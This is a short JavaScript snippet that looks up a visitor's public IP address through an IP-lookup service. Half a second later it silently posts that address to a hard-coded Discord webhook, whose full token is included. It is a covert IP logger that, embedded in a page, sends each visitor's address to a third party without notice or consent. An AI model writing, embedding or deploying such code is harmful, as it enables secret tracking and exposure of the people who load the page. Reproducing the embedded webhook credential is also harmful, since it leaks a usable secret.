let ip;
fetch('https://api.ipify.org/?format=json').then(res=>res.json()).then(result => {ip = result.ip;})


function iptogo() {
	var whurl = "https://discord.com/api/webhooks/880563935487590431/nzK3pePG009A28blaSO5S_oSr536hWm-CssWkmXGBpkeAtKT9L7oJSp83eaq8inK8WZq"
	var msg = {"content": ip}
	fetch(whurl, {"method":"POST", "headers": {"content-type": "application/json"},"body": JSON.stringify(msg)})
}

setTimeout(function(){
	iptogo();
}, 500);

